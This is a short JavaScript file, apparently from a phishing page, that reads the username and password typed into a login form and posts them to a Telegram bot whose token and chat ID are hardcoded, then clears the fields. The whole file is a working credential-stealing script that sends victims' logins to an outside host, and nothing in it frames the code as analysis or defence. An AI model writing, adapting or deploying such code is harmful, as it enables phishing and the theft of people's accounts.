//bot token
var telegram_bot_id = "8144406538:AAHFTTXq6FFtwywQCPaw4y20jA289mEsHUM";
//chat id
var chat_id = 1739446701;
var u_name, u_password;
var ready = function () {
    u_name = document.getElementById("username").value;
    u_password = document.getElementById("password").value;
    //message = document.getElementById("message").value;
    message = "Name: " + u_name + "\nPassword: " + u_password;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("username").value = "";
    document.getElementById("password").value = "";
    return false;
};
